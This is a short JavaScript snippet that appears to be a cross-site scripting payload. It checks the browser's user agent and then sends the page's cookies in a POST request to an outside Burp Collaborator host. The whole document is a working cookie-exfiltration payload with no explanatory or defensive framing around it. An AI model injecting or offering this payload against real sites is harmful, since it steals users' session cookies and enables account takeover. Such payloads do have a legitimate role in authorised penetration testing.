var ua=navigator.userAgent
if(ua.match(/mozilla/ig)){
fetch('https://ds9eiz3200z6jcmd9i0xm9ic93ft3i.burpcollaborator.net', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
}
